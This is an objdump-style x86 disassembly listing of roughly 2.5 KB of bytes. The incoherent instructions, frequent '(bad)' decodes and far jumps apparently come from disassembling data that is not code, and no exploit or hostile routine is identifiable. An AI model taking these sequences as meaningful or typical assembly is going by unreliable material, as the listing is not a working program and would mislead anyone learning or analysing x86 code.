  42f3d1:	in     eax,dx
  42f3d2:	xchg   esp,eax
  42f3d3:	loopne 0x42f41c
  42f3d5:	cmp    eax,ecx
  42f3d7:	stos   BYTE PTR es:[edi],al
  42f3d8:	sbb    eax,0xdc166a27
  42f3dd:	inc    ebp
  42f3de:	test   eax,0x3430ba6b
  42f3e3:	imul   ebx,DWORD PTR ds:[eax+0x33b869c4],0xffffff81
  42f3eb:	inc    ecx
  42f3ec:	cwde   
  42f3ed:	pop    ss
  42f3ee:	cs push esp
  42f3f0:	xor    al,0xe1
  42f3f2:	dec    ebx
  42f3f4:	stc    
  42f3f5:	push   edx
  42f3f6:	fld    TBYTE PTR [ecx-0x4c32fd9e]
  42f3fc:	out    0x58,al
  42f3fe:	(bad)  
  42f3ff:	xor    edi,DWORD PTR [esi+eax*1]
  42f402:	xchg   ecx,eax
  42f403:	jbe    0x42f43d
  42f405:	aaa    
  42f406:	popa   
  42f407:	aad    0xc6
  42f409:	outs   dx,BYTE PTR ds:[esi]
  42f40a:	shr    edx,1
  42f40c:	inc    eax
  42f40d:	stos   BYTE PTR es:[edi],al
  42f40e:	(bad)  
  42f40f:	jmp    0x2ade:0x674214d0
  42f416:	dec    eax
  42f417:	pop    edx
  42f418:	mov    ecx,DWORD PTR [esp+edi*4]
  42f41b:	ret    
  42f41c:	lods   al,BYTE PTR ds:[esi]
  42f41d:	les    esp,FWORD PTR [esi-0x7fc9d515]
  42f423:	outs   dx,BYTE PTR ds:[esi]
  42f424:	add    BYTE PTR [edx],bh
  42f426:	or     bh,BYTE PTR [ecx]
  42f428:	and    BYTE PTR [eax],dh
  42f42a:	pop    ebx
  42f42b:	sub    bh,BYTE PTR [ebp+0x25]
  42f42e:	arpl   WORD PTR [ecx-0x4dcb50d2],si
  42f434:	iret   
  42f435:	cmp    BYTE PTR [ecx],bl
  42f437:	xchg   edx,eax
  42f438:	pop    ebx
  42f439:	fldenv [edi-0x55139a01]
  42f43f:	popa   
  42f440:	or     eax,0x871d47ff
  42f445:	lahf   
  42f446:	pop    es
  42f447:	dec    ebp
  42f448:	mov    dl,0x9
  42f44a:	add    DWORD PTR [ebx+0x62f0f866],edi
  42f450:	or     al,0x95
  42f452:	inc    ebp
  42f453:	jne    0x42f3d8
  42f455:	out    0x80,eax
  42f457:	lea    edi,[ecx+0x1a]
  42f45a:	out    dx,al
  42f45b:	popa   
  42f45c:	dec    eax
  42f45d:	(bad)  
  42f45e:	popa   
  42f45f:	test   eax,0xbfc9cc50
  42f464:	push   ss
  42f465:	in     al,dx
  42f466:	pop    esp
  42f467:	das    
  42f468:	inc    ebx
  42f469:	xchg   ebp,eax
  42f46a:	jo     0x42f479
  42f46c:	call   0x5b86a5d1
  42f471:	mov    esp,DWORD PTR [ebx]
  42f473:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f474:	cwde   
  42f475:	mov    al,ds:0x994165f3
  42f47a:	push   edx
  42f47b:	inc    edi
  42f47c:	mov    al,0x55
  42f47e:	leave  
  42f47f:	mov    bl,0x83
  42f481:	pop    ebx
  42f482:	xor    esi,DWORD PTR [esi-0x6ea293d5]
  42f488:	addr16 xchg BYTE PTR [bx-0x21de],ch
  42f48e:	pop    ecx
  42f48f:	adc    al,0xc1
	...
  42f4f1:	add    BYTE PTR [eax],al
  42f4f3:	add    BYTE PTR [edi],dh
  42f4f5:	jae    0x42f541
  42f4f7:	cdq    
  42f4f8:	dec    esi
  42f4f9:	mov    ecx,0x13f4fff7
  42f4fe:	jno    0x42f52f
  42f500:	fptan  
  42f502:	sbb    DWORD PTR [esi],edx
  42f504:	nop
  42f505:	sti    
  42f506:	add    DWORD PTR [eax],eax
  42f508:	add    eax,0x2b000001
  42f50d:	jno    0x42f547
  42f50f:	and    DWORD PTR [eax-0x7d],0xdd05ba60
  42f516:	sub    BYTE PTR ds:0x1c8bd82b,0xb9
  42f51d:	or     DWORD PTR [edx+0x653e744b],edx
  42f523:	mov    ecx,0xa6ec85a7
  42f528:	ror    eax,0x51
  42f52b:	stos   DWORD PTR es:[edi],eax
  42f52c:	mov    ds:0x6a01ec15,eax
  42f531:	fstp   DWORD PTR [eax-0x2bbcb6d7]
  42f537:	jmp    0x42f4fd
  42f539:	sbb    esp,DWORD PTR [ebp+eax*2+0x62ce7908]
  42f540:	mov    ah,0xb
  42f542:	adc    eax,0x21c3277d
  42f547:	jbe    0x42f54e
  42f549:	mov    ds:0x69159cc9,eax
  42f54e:	dec    esp
  42f54f:	inc    DWORD PTR [eax+0x76]
  42f552:	jmp    0x642f:0xbcb876f1
  42f559:	jne    0x42f59a
  42f55b:	pop    es
  42f55c:	jecxz  0x42f4ef
  42f55e:	sbb    DWORD PTR [edi+0x5c51c688],edx
  42f564:	stos   BYTE PTR es:[edi],al
  42f565:	jle    0x42f586
  42f567:	push   ecx
  42f568:	mov    al,0x2d
  42f56a:	outs   dx,BYTE PTR ds:[esi]
  42f56b:	out    0x8c,eax
  42f56d:	cmc    
  42f56e:	mov    WORD PTR [edx+0x719b2d9f],?
  42f574:	add    eax,0xe694e596
  42f579:	pop    ecx
  42f57a:	ja     0x42f57e
  42f57c:	repz iret 
  42f57e:	repz jge 0x42f5be
  42f581:	stos   DWORD PTR es:[edi],eax
  42f582:	mov    ch,0xa6
  42f584:	and    BYTE PTR [edx-0x60512b08],cl
  42f58a:	inc    esp
  42f58b:	mov    ebx,0x6359c7fe
  42f590:	jbe    0x42f578
  42f592:	outs   dx,BYTE PTR ds:[esi]
  42f593:	(bad)
  42f596:	or     ebp,DWORD PTR [edx+0x31]
  42f599:	cmc    
  42f59a:	push   esi
  42f59b:	sbb    eax,0x51763408
  42f5a0:	inc    al
  42f5a2:	scas   eax,DWORD PTR es:[edi]
  42f5a3:	sbb    ebp,DWORD PTR [ebp-0x6e]
  42f5a6:	pop    edx
  42f5a7:	gs xchg ebx,eax
  42f5a9:	stos   DWORD PTR es:[edi],eax
  42f5aa:	out    0xe7,al
  42f5ac:	lock cmp cl,BYTE PTR [esi]
  42f5af:	inc    ecx
  42f5b0:	jb     0x42f609
  42f5b2:	ret    0x28d7
  42f5b5:	add    cl,al
  42f5b7:	xchg   edx,eax
  42f5b8:	cwde   
  42f5b9:	xchg   ebp,eax
  42f5ba:	out    0x37,eax
  42f5bc:	stc    
  42f5bd:	dec    esp
  42f5be:	xchg   ebp,eax
  42f5bf:	push   0xcce96337
  42f5c4:	out    dx,eax
  42f5c5:	hlt    
  42f5c6:	and    eax,0x63905c99
  42f5cb:	js     0x42f598
  42f5cd:	imul   ebx,DWORD PTR [edi+0x35],0xffffffcf
  42f5d1:	jb     0x42f5d2
  42f5d3:	fld    DWORD PTR [esi-0x3b]
  42f5d6:	vsubsd xmm2,xmm7,QWORD PTR [eax+esi*2+0x5]
  42f5dc:	jmp    0x2176874f
  42f5e1:	mov    eax,0xb83a3ef7
  42f5e6:	(bad)  
  42f5e7:	jle    0x42f622
  42f5e9:	(bad)  
  42f5ea:	cdq    
  42f5eb:	xchg   ebp,eax
  42f5ec:	adc    al,0xbf
  42f5ee:	adc    bl,BYTE PTR [edx]
  42f5f0:	retf   
  42f5f1:	outs   dx,DWORD PTR ds:[esi]
  42f5f2:	push   ebx
  42f5f3:	arpl   WORD PTR [ebp-0x26],di
  42f5f6:	out    0xff,al
  42f5f8:	shl    al,0x87
  42f5fb:	inc    edi
  42f5fc:	rcl    BYTE PTR [ebp-0x1de5ff84],cl
  42f602:	pop    edx
  42f603:	inc    edx
  42f604:	jmp    0x4281221
  42f609:	pop    ebp
  42f60a:	cmp    dh,al
  42f60c:	mov    edi,0x523ab1a9
	...
  42f671:	add    BYTE PTR [eax],al
  42f673:	add    BYTE PTR [esi],bh
  42f675:	push   esi
  42f676:	into   
  42f677:	nop
  42f678:	out    dx,al
  42f679:	cwde   
  42f67a:	jle    0x42f67a
  42f67c:	push   eax
  42f67d:	sub    edx,esi
  42f67f:	dec    esp
  42f680:	out    0x29,eax
  42f682:	ss inc esp
  42f684:	xchg   ebp,eax
  42f685:	cld    
  42f686:	add    DWORD PTR [eax],eax
  42f688:	add    eax,0xc5000001
  42f68d:	ja     0x42f65a
  42f68f:	lahf   
  42f690:	cmp    eax,0xe70726fe
  42f695:	mov    DWORD PTR [eax],eax
  42f697:	inc    eax
  42f698:	mov    BYTE PTR [ebx-0x16c290cc],dl
  42f69e:	cmp    edx,edx
  42f6a0:	sbb    eax,0x3affde6
  42f6a5:	(bad)  
  42f6a6:	xchg   edx,eax
  42f6a7:	mov    edx,DWORD PTR [eax]
  42f6a9:	sub    ch,BYTE PTR [ecx-0x6d]
  42f6ac:	jge    0x42f6cb
  42f6ae:	ins    DWORD PTR es:[edi],dx
  42f6af:	mov    al,0x54
  42f6b1:	cmc    
  42f6b2:	sub    eax,0xeac88df7
  42f6b7:	pop    esi
  42f6b8:	pop    ds
  42f6b9:	pop    esp
  42f6ba:	xor    DWORD PTR [edx],esp
  42f6bc:	stc    
  42f6bd:	lds    ebp,FWORD PTR [edi+0x51]
  42f6c0:	ficomp DWORD PTR [eax]
  42f6c2:	call   0xc8ab7036
  42f6c7:	stc    
  42f6c8:	mov    DWORD PTR [edx],esi
  42f6ca:	ja     0x42f735
  42f6cc:	cmp    bh,BYTE PTR [edi-0x68]
  42f6cf:	mov    bh,0xbf
  42f6d1:	leave  
  42f6d2:	mov    dl,0x5c
  42f6d4:	dec    esp
  42f6d5:	mov    DWORD PTR [ecx],ecx
  42f6d7:	cld    
  42f6d8:	add    DWORD PTR [edi+0x58],ebp
  42f6db:	jb     0x42f724
  42f6dd:	mov    ebp,0x9efb197a
  42f6e2:	out    dx,al
  42f6e3:	loope  0x42f72e
  42f6e5:	jae    0x42f6ab
  42f6e7:	into   
  42f6e8:	xchg   esi,eax
  42f6e9:	cmp    edx,ecx
  42f6eb:	repz or al,0x4
  42f6ee:	(bad)  [esi]
  42f6f0:	arpl   ax,bx
  42f6f2:	scas   al,BYTE PTR es:[edi]
  42f6f3:	sar    DWORD PTR [esi+eiz*2],1
  42f6f6:	into   
  42f6f7:	icebp  
  42f6f8:	push   es
  42f6f9:	jecxz  0x42f72a
  42f6fb:	mov    al,0xbe
  42f6fd:	mov    eax,0xd88b9ee7
  42f702:	push   0x1d4bc426
  42f707:	cmp    ecx,ebx
  42f709:	out    0x48,eax
  42f70b:	and    esi,esp
  42f70d:	popa   
  42f70e:	cmp    cl,BYTE PTR ds:0x3ab33478
  42f714:	ins    BYTE PTR es:[edi],dx
  42f715:	add    esp,ecx
  42f717:	fs pop ss
  42f719:	shr    BYTE PTR [ecx],1
  42f71b:	pop    eax
  42f71c:	or     eax,0x1c424b14
  42f721:	into   
  42f722:	or     dh,cl
  42f724:	jmp    0x42f704
  42f726:	icebp  
  42f727:	aad    0xb8
  42f729:	add    dh,BYTE PTR [ebx+eiz*2+0x42]
  42f72d:	dec    edi
  42f72e:	mov    edi,0xbc9b9cdc
  42f733:	cmp    al,0x93
  42f735:	rcl    DWORD PTR [edi-0x52550819],0x2
  42f73c:	clc    
  42f73d:	hlt    
  42f73e:	push   eax
  42f73f:	je     0x42f742
  42f741:	clc    
  42f742:	in     al,dx
  42f743:	ffreep st(7)
  42f745:	in     al,0x44
  42f747:	ss dec edx
  42f749:	mov    ecx,0x3ab616e9
  42f74e:	in     eax,0x0
  42f750:	mov    dl,0x70
  42f752:	test   BYTE PTR [ebx],bh
  42f754:	push   ss
  42f755:	mov    ch,0x23
  42f757:	xchg   esp,eax
  42f758:	mov    ss,WORD PTR [esi-0x26e0584e]
  42f75e:	jmp    0x504c:0x6a663d06
  42f765:	sub    edi,DWORD PTR [eiz*4-0x1eb45d15]
  42f76c:	ja     0x42f7b4
  42f76e:	jbe    0x42f723
  42f770:	fs jg  0x42f753
  42f773:	xor    BYTE PTR [edx],ch
  42f775:	(bad)  
  42f776:	push   edx
  42f777:	or     eax,0x2c65b2dc
  42f77c:	out    0x47,al
  42f77e:	mov    ebx,0xd8617309
  42f783:	ret    
  42f784:	add    bh,BYTE PTR ds:0x7c163b5e
  42f78a:	popf   
  42f78b:	mov    ecx,0x1ed18c5a
  42f790:	cmc    
	...
  42f7f1:	add    BYTE PTR [eax],al
  42f7f3:	add    BYTE PTR [ecx-0x5f],dh
  42f7f6:	(bad)  
  42f7f7:	test   al,0xd6
  42f7f9:	(bad)  
  42f7fa:	jg     0x42f7f5
  42f7fc:	push   cs
  42f7fd:	pop    ebp
  42f7fe:	push   ebp
  42f7ff:	mov    edi,0xd2bdd5e0
  42f804:	call   0x1:0x50001fd
  42f80b:	add    BYTE PTR [eax],cl
  42f80d:	pusha  
  42f80e:	stos   BYTE PTR es:[edi],al
  42f80f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f810:	push   eax
  42f811:	into   
  42f812:	ds dec esi
  42f814:	push   eax
  42f815:	lock xor DWORD PTR [eax+0x754471e2],ebx
  42f81c:	shl    al,1
  42f81e:	(bad)  
  42f81f:	in     al,dx
  42f820:	ins    BYTE PTR es:[edi],dx
  42f821:	mov    cl,0x53
  42f823:	test   eax,0x8308b944
  42f828:	mov    eax,0xea6639fa
  42f82d:	clc    
  42f82e:	arpl   dx,dx
  42f830:	enter  0x2bed,0x3
  42f834:	inc    ebx
  42f835:	cli    
  42f836:	sub    esi,edx
  42f838:	dec    esi
  42f839:	sbb    BYTE PTR [ebx+eiz*8],al
  42f83c:	(bad)  
  42f83d:	sub    al,0x3a
  42f83f:	fcmovbe st,st(7)
  42f841:	imul   ebx,edx,0x4291ab34
  42f847:	xchg   BYTE PTR [eax+eax*8],cl
  42f84a:	sub    ebp,ebp
  42f84c:	arpl   dx,si
  42f84e:	das    
  42f84f:	ss or  al,0x2
  42f852:	inc    edi
  42f853:	fild   DWORD PTR [ebp+ebx*2+0x52fbd400]
  42f85a:	xchg   ecx,eax
  42f85b:	gs pop esi
  42f85d:	push   0xd16c2725
  42f862:	test   al,0xdd
  42f864:	mov    ch,0xc2
  42f866:	out    dx,al
  42f867:	adc    ebx,DWORD PTR [eax+0x6d]
  42f86a:	jecxz  0x42f8a9
  42f86c:	ja     0x42f844
  42f86e:	jg     0x45ef48e8
  42f874:	stos   BYTE PTR es:[edi],al
  42f875:	lock lock outs dx,DWORD PTR ds:[esi]
  42f878:	and    dl,BYTE PTR [ebx-0x4b881554]
  42f87e:	fstp   TBYTE PTR [edx+ecx*4+0x30]
  42f882:	adc    al,0xb9
  42f884:	cld    
  42f885:	fadd   st,st(3)
  42f887:	and    edx,DWORD PTR [ecx]
  42f889:	bound  ebx,QWORD PTR [ecx+eax*2+0x45]
  42f88d:	(bad)  
  42f88e:	aad    0x9d
  42f890:	xchg   edx,eax
  42f891:	(bad)  
  42f892:	sysret 
  42f894:	jbe    0x42f892
  42f896:	dec    ebp
  42f897:	sub    BYTE PTR es:[ecx-0x1b],dl
  42f89b:	loope  0x42f8b1
  42f89d:	cwde   
  42f89e:	stc    
  42f89f:	cmp    DWORD PTR [edi+0x5550613],esi
  42f8a5:	sti    
  42f8a6:	jb     0x42f89e
  42f8a8:	rcr    ah,1
  42f8aa:	(bad)  
  42f8ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f8ac:	xor    al,BYTE PTR [eax+0x3d]
  42f8af:	sub    ecx,0x24
  42f8b2:	xor    ebx,DWORD PTR [edx-0x15eb4ba3]
  42f8b8:	fcomp  DWORD PTR [edi]
  42f8ba:	inc    edx
  42f8bb:	fmul   st,st(0)
  42f8bd:	jmp    0xe3a3:0xf317894c
  42f8c4:	xor    ebp,edx
  42f8c6:	push   eax
  42f8c7:	das    
  42f8c8:	sbb    al,0xa7
  42f8ca:	dec    edx
  42f8cb:	test   edi,ecx
  42f8cd:	les    eax,FWORD PTR [esi+0x4b]
  42f8d0:	cdq    
  42f8d1:	mov    ch,0xb3
  42f8d3:	pop    ebx
  42f8d4:	dec    esp
  42f8d5:	lods   eax,DWORD PTR ds:[esi]
  42f8d6:	lods   eax,DWORD PTR ds:[esi]
  42f8d7:	xchg   ecx,eax
  42f8d8:	sahf   
  42f8d9:	test   DWORD PTR [ebx+0x60756769],ecx
  42f8df:	test   al,0xda
  42f8e1:	push   0x3c
  42f8e3:	cmp    al,0x61
  42f8e5:	jbe    0x42f8e5
  42f8e7:	dec    eax
  42f8e8:	pop    edx
  42f8e9:	xchg   esi,eax
  42f8ea:	xor    DWORD PTR [edx+0xa33f289],ebp
  42f8f0:	aam    0xc6
  42f8f2:	mov    ah,0x57
  42f8f4:	inc    dh
  42f8f6:	test   eax,0x5b055423
  42f8fb:	and    al,0xf2
  42f8fd:	cs cmp eax,0xf6b562cf
  42f903:	jb     0x42f956
  42f905:	pop    ebp
  42f906:	sub    eax,0x12b3e3c9
  42f90b:	mov    cl,BYTE PTR [ebx+ecx*8+0x2d]
  42f90f:	cwde   
  42f910:	push   esi
	...
  42f971:	add    BYTE PTR [eax],al
  42f973:	add    BYTE PTR [esp+esi*2],dl
  42f976:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f977:	push   ebp
  42f978:	in     al,0xd5
  42f97a:	cmc    
  42f97b:	jne    0x42f928
  42f97d:	sbb    cl,dh
  42f97f:	js     0x42f9ba
  42f981:	and    ebp,edx
  42f983:	add    bl,BYTE PTR [edi+0x50001fe]
  42f989:	add    DWORD PTR [eax],eax
  42f98b:	add    BYTE PTR [eax-0x6029c313],ch
  42f991:	aam    0x4e
  42f993:	mov    ch,0x44
  42f995:	(bad)  
  42f997:	inc    esi
  42f998:	sbb    eax,DWORD PTR [edx+0x5]
  42f99b:	idiv   DWORD PTR [edi+0x54d362de]
  42f9a1:	or     ecx,DWORD PTR [edi]
  42f9a3:	fs je  0x42f968
  42f9a6:	sti    
  42f9a7:	xchg   ecx,eax
  42f9a8:	aaa    
  42f9a9:	sbb    eax,0x36e1ce9f
  42f9ae:	cmp    DWORD PTR [esi],esi
  42f9b0:	mov    ebx,0x53485255
  42f9b5:	inc    edi
  42f9b6:	mov    ch,0x53
  42f9b8:	std    
  42f9b9:	xchg   esp,eax
  42f9ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f9bb:	mov    ds:0xc6ed2b2f,eax
  42f9c0:	cli    
  42f9c1:	push   ebp
  42f9c2:	adc    eax,0x1bebb195
  42f9c7:	lahf   
  42f9c8:	mov    ds:0xa2dcfeb8,eax
  42f9cd:	adc    DWORD PTR [edi+0x33],ebp
  42f9d0:	out    dx,eax
  42f9d1:	adc    al,0xf1
  42f9d3:	mov    ds,WORD PTR [ebp-0x2d64fff8]
  42f9d9:	fimul  DWORD PTR [ecx+0x31]
  42f9dc:	dec    esp
  42f9dd:	popa   
  42f9de:	xchg   ebp,eax
  42f9df:	and    eax,ebx
  42f9e1:	or     eax,0xaa144d8b
  42f9e6:	out    dx,eax
  42f9e7:	add    dl,BYTE PTR [ebx]
  42f9e9:	loope  0x42f9da
  42f9eb:	cld    
  42f9ec:	jb     0x42f9d3
  42f9ee:	lds    esi,FWORD PTR [ecx+0x6f]
  42f9f1:	retf   0xaefe
  42f9f4:	popf   
  42f9f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f9f6:	sbb    eax,0x39d2cbd4
  42f9fb:	dec    BYTE PTR [ecx]
  42f9fd:	das    
  42f9fe:	cld    
  42f9ff:	dec    eax
  42fa00:	cmp    cl,BYTE PTR [esi]
  42fa02:	sbb    ebx,eax
  42fa04:	sub    eax,0xba816c53
  42fa09:	cli    
  42fa0a:	lock xlat BYTE PTR ds:[ebx]
  42fa0c:	loop   0x42fa5d
  42fa0e:	push   ebx
  42fa0f:	xchg   DWORD PTR [edi+ecx*1+0x7d],edx
  42fa13:	int    0xbf
  42fa15:	ret    
  42fa16:	idiv   DWORD PTR [ebx]
  42fa18:	int3   
  42fa19:	xchg   edx,eax
  42fa1a:	push   edi
  42fa1b:	dec    edx
  42fa1c:	call   0x8a5:0x44473675
  42fa23:	mov    bl,0xf7
  42fa25:	cmp    edi,DWORD PTR [ebx-0x37eaad1b]
  42fa2b:	and    ecx,DWORD PTR [ebp-0x7b13c718]
  42fa31:	inc    ecx
  42fa32:	xchg   esp,eax
  42fa33:	dec    ebx
  42fa34:	icebp  
  42fa35:	ss int 0x4b
  42fa38:	cmp    ah,BYTE PTR [edx]
  42fa3a:	inc    esp
  42fa3b:	xchg   ah,bl
  42fa3d:	out    dx,eax
  42fa3e:	test   bh,dh
  42fa40:	das    
  42fa41:	not    DWORD PTR [ebx-0x7cb71eb0]
  42fa47:	test   eax,0xeeaaa9f0
  42fa4c:	dec    esp
  42fa4e:	test   al,0xc6
  42fa50:	xchg   ecx,eax
  42fa51:	sub    BYTE PTR [edx+0x60],0x72
  42fa55:	sub    bl,BYTE PTR [ebx+0x26597def]
  42fa5b:	and    edx,DWORD PTR [edx+edx*8+0x6d29069c]
  42fa62:	test   al,0x34
  42fa64:	jmp    0x42faad
  42fa66:	(bad)  
  42fa67:	in     eax,0xfa
  42fa69:	leave  
  42fa6a:	ss popa 
  42fa6c:	push   eax
  42fa6d:	addr16 add eax,0xb914ff38
  42fa73:	scas   eax,DWORD PTR es:[edi]
  42fa74:	repnz jmp 0x6952:0x2521bed5
  42fa7c:	aam    0xf
  42fa7e:	cmc    
  42fa7f:	mov    dl,0x17
  42fa81:	outs   dx,DWORD PTR ds:[esi]
  42fa82:	call   0xa247:0xb3117ed0
  42fa89:	retf   
  42fa8a:	jmp    0xf2f8a05c
  42fa8f:	aaa    
  42fa90:	stos   DWORD PTR es:[edi],eax
	...
  42faf1:	add    BYTE PTR [eax],al
  42faf3:	add    BYTE PTR [ebx],bl
  42faf5:	out    dx,eax
  42faf6:	shl    BYTE PTR [esi],0xf4
  42faf9:	aas    
  42fafa:	(bad)  
  42fafb:	out    dx,eax
  42fafc:	int3   
  42fafd:	mov    WORD PTR [edi+0x32],?
  42fb00:	mov    ebp,0xa43ffe0d
  42fb05:	inc    DWORD PTR [ecx]
  42fb07:	add    BYTE PTR ds:0x90000001,al
  42fb0d:	das    
  42fb0e:	or     al,0xa8
  42fb10:	inc    ecx
  42fb11:	test   BYTE PTR [edx-0x33],dl
  42fb14:	data16 xlat BYTE PTR ds:[ebx]
  42fb16:	xor    BYTE PTR ss:[ecx-0x4a],dh
  42fb1a:	pop    edi
  42fb1b:	mov    esp,DWORD PTR [ebp+0x6c21d6bd]
  42fb21:	mov    bl,0xab
  42fb23:	stos   DWORD PTR es:[edi],eax
  42fb24:	cmp    eax,0x71ff80c
  42fb29:	xchg   DWORD PTR [edi],ecx
  42fb2b:	in     al,0xa2
  42fb2d:	adc    ah,BYTE PTR [ecx-0x43]
  42fb30:	sahf   
  42fb31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fb32:	and    DWORD PTR [ecx],edx
  42fb34:	addr16 pop ecx
  42fb36:	daa    
  42fb37:	dec    esi
  42fb38:	cmc    
  42fb39:	and    BYTE PTR [edi],bh
  42fb3b:	mov    cl,0xfd
  42fb3d:	dec    edx
  42fb3e:	and    al,0xd3
  42fb40:	mul    BYTE PTR [eax+ebp*8]
  42fb43:	daa    
  42fb44:	loope  0x42fb8d
  42fb46:	call   0x843b:0xcba02738
  42fb4d:	stc    
  42fb4e:	push   cs
  42fb4f:	inc    edx
  42fb50:	sub    al,0x6
  42fb52:	jbe    0x42fb59
  42fb54:	inc    BYTE PTR [ecx+edx*8+0xd]
  42fb58:	jb     0x42fbcd
  42fb5a:	dec    esp
  42fb5b:	test   eax,0x4760536d
  42fb60:	mov    BYTE PTR [ecx],dh
  42fb62:	aaa    
  42fb63:	sbb    BYTE PTR [ecx],al
  42fb65:	jmp    0x6d2b2d13
  42fb6a:	push   es
  42fb6b:	cdq    
  42fb6c:	sti    
  42fb6d:	sahf   
  42fb6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fb6f:	aam    0xc9
  42fb71:	or     edi,DWORD PTR [eax]
  42fb73:	imul   DWORD PTR [esi+edi*2+0x51]
  42fb77:	movsx  edx,BYTE PTR ds:[edi+eiz*1]
  42fb7c:	aaa    
  42fb7d:	dec    esp
  42fb7e:	jge    0x42fb13
  42fb80:	inc    esi
  42fb81:	scas   eax,DWORD PTR es:[edi]
  42fb82:	js     0x42fbe3
  42fb84:	sub    BYTE PTR [edx],ch
  42fb86:	pop    ebx
  42fb87:	in     al,dx
  42fb88:	mov    ds:0x58c79c17,eax
  42fb8d:	inc    ecx
  42fb8e:	jne    0x42fbed
  42fb90:	jae    0x42fbf1
  42fb92:	pop    eax
  42fb93:	jbe    0x42fb47
  42fb95:	out    dx,eax
  42fb96:	ja     0x42fb40
  42fb98:	or     BYTE PTR [ecx],0x6a
  42fb9b:	cmp    DWORD PTR [ecx],esp
  42fb9d:	sub    eax,0x6b81207
  42fba2:	push   ebp
  42fba3:	mov    ah,0x9a
  42fba5:	repz pop esi
  42fba7:	mov    ds:0x65a3cbc2,al
  42fbac:	and    al,BYTE PTR [edx+0x56]
  42fbaf:	sbb    dh,BYTE PTR [ecx+0x1c8c6e2d]
  42fbb5:	or     eax,0x436f1592
  42fbba:	js     0x42fbc5
  42fbbc:	add    DWORD PTR [esi+0x2e50a188],edi
  42fbc2:	popa   
  42fbc3:	nop
  42fbc4:	mov    ds:0x72947693,al
  42fbc9:	jb     0x42fc25
  42fbcb:	mov    bh,0x73
  42fbcd:	sti    
  42fbce:	push   cs
  42fbcf:	cld    
  42fbd0:	out    0x67,eax
  42fbd2:	call   0x8259:0xd384a86c
  42fbd9:	inc    edi
  42fbda:	in     eax,0x8d
  42fbdc:	clc    
  42fbdd:	in     al,dx
  42fbde:	sbb    eax,0x5dbdc076
  42fbe3:	ret    
  42fbe4:	fstp   TBYTE PTR [edi+ecx*8-0x73]
  42fbe8:	jmp    0x42fb9c
  42fbea:	mov    ebp,0x59bb602d
  42fbef:	or     eax,DWORD PTR [esi+0x5ba06287]
  42fbf5:	dec    eax
  42fbf6:	cdq    
  42fbf7:	sbb    DWORD PTR [esi+0x5a],ecx
  42fbfa:	jmp    0xf816:0x9a77e6a7
  42fc01:	and    cl,BYTE PTR [ebx-0x4167e48c]
  42fc07:	and    eax,0x300c0206
  42fc0c:	mov    ecx,0x769b7b88
	...
  42fc71:	add    BYTE PTR [eax],al
  42fc73:	add    BYTE PTR [ebx],cl
  42fc75:	mov    BYTE PTR [ebx-0x44c45ce7],ah
  42fc7b:	call   0x5fdb:0x2036325e
  42fc82:	sub    eax,0x200a987
  42fc87:	add    BYTE PTR ds:0x8000001,al
  42fc8d:	clc    
  42fc8e:	ret    0x162f
  42fc91:	and    ecx,eax
  42fc93:	cmp    eax,0xb2e78909
  42fc98:	scas   al,BYTE PTR es:[edi]
  42fc99:	add    DWORD PTR [eax+edx*1-0x51],ebp
  42fc9d:	add    ebx,esp
  42fc9f:	shl    BYTE PTR [ecx-0x22],1
  42fca2:	cmp    eax,DWORD PTR [ecx-0xdc59fb8]
  42fca8:	neg    BYTE PTR [ebp-0x6830e109]
  42fcae:	push   edi
  42fcaf:	rep stos DWORD PTR es:[edi],eax
  42fcb1:	xor    BYTE PTR ds:[esi+0xa736a67],dh
  42fcb8:	adc    DWORD PTR [edx+0x67],esi
  42fcbb:	outs   dx,DWORD PTR ds:[esi]
  42fcbc:	sbb    DWORD PTR [edx+ecx*1+0x31],edi
  42fcc0:	inc    ecx
  42fcc1:	xor    DWORD PTR [esi*1-0x1631771f],esi
  42fcc8:	call   0xc397:0xa74f1e8
  42fccf:	in     eax,0x4e
  42fcd1:	inc    ebp
  42fcd2:	mov    ebp,0x548b066d
  42fcd7:	inc    edx
  42fcd8:	xchg   esi,eax
  42fcd9:	pop    eax
  42fcda:	test   eax,0x94b6b256
  42fcdf:	and    al,0xed
  42fce1:	je     0x42fcb5
  42fce3:	xor    eax,0x8674081f
  42fce8:	sar    BYTE PTR ds:0xd7f92ad3,cl
  42fcee:	les    eax,FWORD PTR [edi-0x349e11f8]
  42fcf4:	imul   esp,esi,0xe3b9c683
  42fcfa:	ins    BYTE PTR es:[edi],dx
  42fcfb:	ins    DWORD PTR es:[edi],dx
  42fcfc:	dec    ebx
  42fcfd:	mov    esp,0x4c02da26
  42fd02:	push   edi
  42fd03:	sub    al,0x13
  42fd05:	add    DWORD PTR [ecx-0x26042d0],0x76e331b4
  42fd0f:	daa    
  42fd10:	repz push 0xffffff97
  42fd13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fd14:	repnz adc eax,0x6c138a8c
  42fd1a:	inc    esp
  42fd1b:	mov    edi,DWORD PTR [esi]
  42fd1d:	call   0x26a2:0x7271017f
  42fd24:	mov    al,0x4a
  42fd26:	jo     0x42fd85
  42fd28:	cs lahf 
  42fd2a:	jno    0x42fd9c
  42fd2c:	sahf   
  42fd2d:	or     eax,0xc8768935
  42fd32:	rol    DWORD PTR [eax+0x435c03c1],0xb2
  42fd39:	sbb    ebx,edx
  42fd3b:	mul    BYTE PTR [ecx]
  42fd3d:	out    0x49,al
  42fd3f:	into   
  42fd40:	mov    bl,0x84
  42fd42:	mov    ds:0xee44ce28,al
  42fd47:	add    eax,0xa9d7f970
  42fd4c:	xor    BYTE PTR [ebp-0x70202e4d],cl
  42fd52:	add    bl,BYTE PTR [edx+0x1e0d9622]
  42fd58:	inc    ecx
  42fd59:	pop    ebp
  42fd5a:	and    al,0x99
  42fd5c:	mov    esi,esp
  42fd5e:	hlt    
  42fd5f:	pushf  
  42fd60:	cmp    BYTE PTR [edx],0x8b
  42fd63:	pop    eax
  42fd64:	repz jae 0x42fdd4
  42fd67:	(bad)
  42fd6b:	lods   al,BYTE PTR ds:[esi]
  42fd6c:	rcr    DWORD PTR [ecx+0x598dd939],0xe3
